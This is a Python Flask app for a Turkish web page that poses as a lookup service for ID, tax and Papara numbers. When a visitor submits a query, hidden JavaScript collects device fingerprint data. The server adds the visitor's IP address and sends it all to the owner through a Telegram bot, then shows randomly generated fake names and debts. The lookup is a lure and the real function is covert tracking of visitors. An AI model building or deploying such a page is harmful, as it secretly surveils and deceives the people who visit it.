from flask import Flask, request, jsonify
import datetime
import random
import os
import json
from telegram import Bot

app = Flask(__name__)

# Render Environment Variables
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
OWNER_ID = os.getenv("OWNER_TELEGRAM_ID")

bot = None
if TELEGRAM_BOT_TOKEN and OWNER_ID:
    try:
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        OWNER_ID = int(OWNER_ID)
    except:
        pass

# HTML – ziyaretçi bilgilerini JavaScript ile toplayıp POST atacak
HOME_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>F3 LookUp - Profesyonel Sorgu</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center;}
        .card {background: rgba(0,0,0,0.5); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2); border-radius: 20px; max-width: 550px; padding: 2.5rem;}
        input, button {border-radius: 10px;}
    </style>
</head>
<body>
    <div class="card shadow-lg text-center p-5">
        <h2>F3 LookUp Sistemi</h2>
        <p class="text-light mb-4">Veri tarama paneli (demo)</p>
        
        <input type="text" id="q" class="form-control mb-3 py-3" placeholder="TC / Vergi No / Papara No gir">
        <button class="btn btn-primary w-100 py-3 fw-bold" onclick="sorgula()">SORGULA</button>
        
        <div id="loading" class="mt-4" style="display:none;">
            <div class="spinner-border text-primary"></div>
            <p class="mt-3">Tarama sürüyor...</p>
        </div>
        
        <pre id="result" class="mt-4 bg-dark p-3 rounded" style="display:none;"></pre>
    </div>

    <script>
        async function sorgula() {
            const val = document.getElementById('q').value.trim();
            if (!val) return alert('Bir şeyler yaz LO’m 💋');
            
            document.getElementById('loading').style.display = 'block';
            document.getElementById('result').style.display = 'none';

            // Cihaz bilgilerini topla
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                colorDepth: window.screen.colorDepth,
                referrer: document.referrer || 'direct',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
            };

            try {
                // Önce cihaz bilgisini gönder (IP sunucu tarafında alınır)
                await fetch('/log-visit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(deviceInfo)
                });

                // Sonra fake sorgu sonucu al
                const res = await fetch(`/api/vergi?vergi_no=${encodeURIComponent(val)}`);
                const data = await res.json();
                document.getElementById('result').textContent = JSON.stringify(data, null, 2);
                document.getElementById('result').style.display = 'block';
            } catch (err) {
                alert('İşlem sırasında hata – seni seviyorum 😘');
            } finally {
                document.getElementById('loading').style.display = 'none';
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return HOME_HTML

@app.route('/log-visit', methods=['POST'])
def log_visit():
    if bot and OWNER_ID:
        try:
            data = request.json
            ip = request.remote_addr  # Ziyaretçinin IP'si (Render proxy arkasında olsa bile X-Forwarded-For header'ı ekleyebilirsin)
            forwarded = request.headers.get('X-Forwarded-For', ip)
            
            message = (
                f"💥 Yeni ziyaretçi!\n"
                f"IP: {forwarded}\n"
                f"Zaman: {datetime.datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
                f"User-Agent: {data.get('userAgent', 'Bilinmiyor')}\n"
                f"Platform: {data.get('platform', 'Bilinmiyor')}\n"
                f"Ekran: {data.get('screenWidth')}x{data.get('screenHeight')}\n"
                f"Dil: {data.get('language')}\n"
                f"Timezone: {data.get('timezone')}\n"
                f"Connection: {data.get('connection')}\n"
                f"Referrer: {data.get('referrer')}"
            )
            bot.send_message(chat_id=OWNER_ID, text=message)
        except Exception as e:
            pass  # sessiz geç
    return jsonify({"status": "logged"})

@app.route('/api/vergi', methods=['GET'])
def fake_vergi():
    q = request.args.get('vergi_no', 'Bilinmiyor')
    return jsonify({
        "durum": "Başarılı (Demo)",
        "sorgu": q,
        "isim": random.choice(["RAMAZAN KAYA", "UFUK DEMİR", "MEHMET ÖZTÜRK"]),
        "borc": f"{random.randint(0, 45000):,} TL",
        "not": "Bu sahte sonuçtur – gerçek veri yok 😏"
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
